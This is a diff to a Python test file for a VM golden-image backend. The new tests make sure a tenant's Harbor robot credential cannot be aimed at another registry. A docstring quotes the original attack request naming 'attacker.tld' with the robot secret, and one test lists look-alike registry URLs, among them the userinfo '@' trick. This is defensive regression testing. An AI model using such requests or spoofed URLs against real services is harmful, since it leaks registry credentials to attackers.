@@ -85,7 +85,12 @@ async def _create(k8s: MagicMock, image: GoldenImageCreate, namespace="tenant-a"
 @pytest.fixture(autouse=True)
 def _a_configured_harbor(monkeypatch: pytest.MonkeyPatch) -> None:
     monkeypatch.setenv("HARBOR_URL", "https://harbor.example:443")
+    # The catalogue path is gated by the same flag the list and publish paths
+    # use. It used to be the one Harbor path with no gate at all.
+    monkeypatch.setenv("HARBOR_IMAGE_ENABLED", "true")
     monkeypatch.delenv("OPERATOR_IMAGE_ENABLED", raising=False)
+    monkeypatch.delenv("HARBOR_ROBOT_SECRET", raising=False)
+    monkeypatch.delenv("HARBOR_CA_CONFIGMAP", raising=False)
 
 
 class TestTheRegistryUrlTheBackendBuilds:
@@ -267,22 +272,198 @@ class TestWhatTheCallerMayStillOverride:
             "url": "docker://other.example/p/u:1"
         }
 
-    async def test_an_explicit_secret_wins_over_the_convention(
+    async def test_a_caller_supplied_registry_at_harbors_own_host_is_authenticated(
         self, monkeypatch: pytest.MonkeyPatch,
     ) -> None:
+        """The credential follows the HOST, so Harbor's own host still gets it.
+
+        This is the other half of the rule the security tests below pin: the
+        decision is made from the resolved host and from nothing else, so a
+        full URL naming the configured Harbor is treated exactly like a
+        catalogue selection would be.
+        """
         captured, _ = await _create(
             _k8s(),
             GoldenImageCreate(
                 display_name="U",
-                catalog_ref="p/u:1",
-                source_registry_secret="a-specific-secret",
+                source_registry="docker://harbor.example:443/p/u:1",
                 size="10Gi",
             ),
         )
 
         assert captured["body"]["spec"]["source"]["registry"]["secretRef"] == (
-            "a-specific-secret"
+            "harbor-robot"
         )
+
+    async def test_a_public_harbor_project_with_no_robot_secret_still_pulls(
+        self, monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """An absent Secret refuses a CATALOGUE pull and degrades a raw one.
+
+        A request that names its own `source_registry` pulled anonymously
+        before this feature existed, and a deployment with a public Harbor
+        project and no robot Secret is not misconfigured — so it keeps
+        working. The catalogue path is the one where the credential is the
+        point, and there the same absence is a 422 (see
+        test_a_missing_robot_secret_is_refused_loudly_not_pulled_anonymously).
+        """
+        captured, _ = await _create(
+            _k8s(secret_exists=False),
+            GoldenImageCreate(
+                display_name="U",
+                source_registry="docker://harbor.example:443/p/u:1",
+                size="10Gi",
+            ),
+        )
+
+        assert captured["body"]["spec"]["source"]["registry"] == {
+            "url": "docker://harbor.example:443/p/u:1"
+        }
+
+
+class TestTheCredentialCannotBeAimedAtAnotherRegistry:
+    """BLOCKER: the tenant's Harbor robot password, sent wherever asked.
+
+    `source_registry_secret` used to be a request field, and the catalogue
+    branch read `if image.catalog_ref and not registry_url` — so supplying
+    `source_registry` skipped host derivation entirely while the secret
+    flowed through untouched. A single POST with
+
+        {"source_registry": "docker://attacker.tld/x:1",
+         "source_registry_secret": "harbor-robot"}
+
+    made CDI authenticate to the attacker's registry with the tenant's robot
+    credential. At the commit this branch started from, a registry source was
+    built with no secretRef at all, so the same request got an anonymous pull:
+    the credential was added by this feature and had to be taken back off the
+    request.
+
+    The fix is not a URL allow-list. The credential is derived from the
+    RESOLVED HOST and the fields are gone.
+    """
+
+    async def test_a_non_harbor_registry_gets_no_secret_ref(
+        self, monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """The exact attack, through the handler: no credential comes out."""
+        captured, _ = await _create(
+            _k8s(),
+            GoldenImageCreate(
+                display_name="U",
+                source_registry="docker://attacker.tld/x:1",
+                size="10Gi",
+            ),
+        )
+
+        registry = captured["body"]["spec"]["source"]["registry"]
+        assert registry == {"url": "docker://attacker.tld/x:1"}
+        assert "secretRef" not in registry
+        assert "certConfigMap" not in registry
+
+    async def test_the_credential_fields_no_longer_exist_on_the_request(self) -> None:
+        """Removed, not validated. A field that is not there cannot be abused.
+
+        Pydantic ignores unknown keys, so a client still sending the old
+        fields is not broken — the values are simply dropped on the floor,
+        which is the whole point.
+        """
+        assert "source_registry_secret" not in GoldenImageCreate.model_fields
+        assert "source_registry_ca_configmap" not in GoldenImageCreate.model_fields
+
+        image = GoldenImageCreate(
+            display_name="U",
+            source_registry="docker://attacker.tld/x:1",
+            source_registry_secret="harbor-robot",
+            source_registry_ca_configmap="harbor-ca",
+            size="10Gi",
+        )
+        assert not hasattr(image, "source_registry_secret")
+        assert not hasattr(image, "source_registry_ca_configmap")
+
+    @pytest.mark.parametrize(
+        "url",
+        [
+            # Userinfo: the authority's host is attacker.tld, and reading the
+            # host off the left of the "@" is the classic way to be fooled.
+            "docker://harbor.example:443@attacker.tld/x:1",
+            # A different port on the right host is a different registry.
+            "docker://harbor.example:8443/x:1",
+            # A prefix that is not the host.
+            "docker://harbor.example.attacker.tld/x:1",
+            # Not a docker:// URL at all.
+            "https://harbor.example:443/x:1",
+        ],
+    )
+    async def test_a_url_that_only_looks_like_harbor_gets_no_secret_ref(
+        self, url: str, monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        captured, _ = await _create(
+            _k8s(),
+            GoldenImageCreate(display_name="U", source_registry=url, size="10Gi"),
+        )
+
+        assert "secretRef" not in captured["body"]["spec"]["source"]["registry"]
+
+    async def test_a_catalog_ref_and_a_source_registry_together_are_refused(
+        self, monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """Two sources for one disk. Preferring one silently is how the
+        bypass worked: `if image.catalog_ref and not registry_url` meant a
+        caller could send both and have the catalogue half ignored."""
+        with pytest.raises(HTTPException) as exc_info:
+            await _create(
+                _k8s(),
+                GoldenImageCreate(
+                    display_name="U",
+                    catalog_ref="p/u:1",
+                    source_registry="docker://attacker.tld/x:1",
+                    size="10Gi",
+                ),
+            )
+
+        assert exc_info.value.status_code == 422
+
+
+class TestTheCatalogueHalfIsGatedLikeEverythingElseHarbor:
+    """BLOCKER: the flag gated 2 of 3 Harbor paths.
+
+    `harbor_image_path_enabled()` appeared at the list handler and at publish,
+    and nowhere in materialise — so "with HARBOR_IMAGE_ENABLED unset the
+    behaviour is unchanged" was false, and the credential-handling code above
+    ran on every deployment whether it had asked for Harbor or not.
+    """
+
+    async def test_a_catalogue_materialise_with_the_flag_off_is_501(
+        self, monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        monkeypatch.delenv("HARBOR_IMAGE_ENABLED", raising=False)
+
+        with pytest.raises(HTTPException) as exc_info:
+            await _create(
+                _k8s(),
+                GoldenImageCreate(display_name="U", catalog_ref="p/u:1", size="10Gi"),
+            )
+
+        assert exc_info.value.status_code == 501
+
+    async def test_the_flag_off_leaves_ordinary_sources_alone(
+        self, monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """The gate is on the catalogue path, not on the endpoint."""
+        monkeypatch.delenv("HARBOR_IMAGE_ENABLED", raising=False)
+
+        captured, _ = await _create(
+            _k8s(),
+            GoldenImageCreate(
+                display_name="U",
+                source_url="https://cloud-images.example/x.img",
+                size="10Gi",
+            ),
+        )
+
+        assert captured["body"]["spec"]["source"] == {
+            "http": {"url": "https://cloud-images.example/x.img"}
+        }
 
 
 class TestTheRefIsNotAFreeTextField:
